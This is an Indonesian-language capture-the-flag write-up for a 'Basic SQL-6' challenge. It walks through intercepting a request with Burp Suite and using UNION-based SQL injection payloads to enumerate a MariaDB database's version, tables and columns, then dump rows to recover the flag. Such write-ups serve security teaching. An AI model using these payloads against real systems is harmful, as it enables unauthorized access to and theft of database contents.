<h1><b>Basic SQL-6</h1></b>
<pre>
Select form (ID, Username, Group)
</pre>
</b><h3>Solution</h3></b>
<p align='justify'>Jika kita coba submit salah satu list, maka URLnya berubah sama sekali. Dapat dipastikan ini menggunakan method requests GET, yang artinya kita harus melakukan interception untuk modifikasi 
data yang kita kirim ke server. Disini saya menggunakan burpsuit, setting burpsuit untuk dapat melakukan interception khususnya pada challenge ini</p>
<p align='justify'>Jika selesai, coba interception content dan modifikasi dengan SQL Injection, contohnya admin --> admin'</p>
<p align='center'>
  <img src='https://github.com/enomarozi/Writeup-CTF_Online/blob/master/BackdoorCTF/Images/BurpSuit_Venom1.jpg'>
</p>
<p align='justify'>Setelah dilakukan beberapa kali injection dan hasilnya error semua, disini saya beranggapan mungkin pada form ID itu type Integer, yaitu kita harus menginputkan 
nilai yang diapiti tanda kutip(') supaya nilai inputan menjadi type string atau varchar di MySQL, dan kondisi ini berlaku union injection</p>
<p align='justify'>Sekarang coba injection untuk menentukan banyak column pada table database</p>
<pre>
1. '-1' union select 1,2 -- - (terjadi error)
2. '-1' union select 1,2,3 -- - (berhasil)
3. '-1' union select 1,2,3,4 -- - (terjadi error)
</pre>
<p align='justify'>Berarti kita mendapatkan bahwa pada table hanya terdiri 3 column, sekarang sesi mendapatkan nama table dan versi database</p>
<pre>
'-1' union select version(),database(),3 -- -
Hasilnya
Your ID : 10.3.23-MariaDB-1
Username : CTF
Group : 3
</pre>
<p align='justify'>Kita sudah mendapatkan nama databasenya yaitu <b>CTF</b>, selanjutnya mendapatkan nama table pada DB</p>
<pre>
'-1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='CTF'),2,3 -- -
Hasilnya
Your ID : SQL_Challenge8
Username : 2
Group : 3
</pre>
<p>Dan nama table sudah didapatkan yaitu <b>SQL_Challenge8</b>, selanjutnya mencari nama column dari table</p>
<pre>
'-1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='SQL_Challenge8'),2,3 -- -
Hasilnya
Your ID : id,username,level
Username : 2
Group : 3
</pre>
<p align='justify'>Jika kita sudah mendapatkan table dan column, sekarang kita lakukan injection untuk seluruh field, untuk field yang sudah terdapat pada list select abaikan saja, yang artinya kita mulai dari field 4,1</p>
<pre>
'-1' union select (select id from SQL_Challenge8 limit 4,1),(select username from SQL_Challenge8 limit 4,1),(select level from SQL_Challenge8 limit 4,1) -- -  
Your ID : 9989
Username : Flag
Group : privilage level flag
'-1' union select (select id from SQL_Challenge8 limit 5,1),(select username from SQL_Challenge8 limit 5,1),(select level from SQL_Challenge8 limit 5,1) -- -   
Your ID : 9999
Username : Flag
Group : more
'-1' union select (select id from SQL_Challenge8 limit 6,1),(select username from SQL_Challenge8 limit 6,1),(select level from SQL_Challenge8 limit 6,1) -- - 
Your ID : 1111
Username : Flag
Group : more again
'-1' union select (select id from SQL_Challenge8 limit 7,1),(select username from SQL_Challenge8 limit 7,1),(select level from SQL_Challenge8 limit 7,1) -- - 
Your ID : 1337
Username : Flag
Group : VenomCTF{0rd3r_BY_4_1s_3rr0r}
</pre>
<p align='center'>
  <img src='https://github.com/enomarozi/Writeup-CTF_Online/blob/master/BackdoorCTF/Images/BurpSuit_Venom2.jpg'>
</p>
<p>Dan flag didapatkan pada field 7,1 column Level</p>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{0rd3r_BY_4_1s_3rr0r}
</pre>
